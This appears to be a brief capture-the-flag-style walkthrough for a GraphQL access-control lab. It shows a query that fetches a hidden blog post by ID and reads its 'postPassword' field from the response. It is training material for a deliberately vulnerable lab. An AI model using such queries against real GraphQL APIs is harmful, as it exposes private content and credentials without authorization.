# Accessing private GraphQL posts

Check Network and find `/graphql/v1` query

[Save GraphQL queries to site map](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql)

Use Intruder or investigate blog posts IDs. Id "3" is missing in list. Query it:

```json
{
    "query": "query($id: Int!) { getBlogPost(id: $id) { id, image, title, author, date, summary, paragraphs, isPrivate, postPassword } }",
    "variables": {
        "id": 3
    }
}
```

Read "postPassword" value from response.
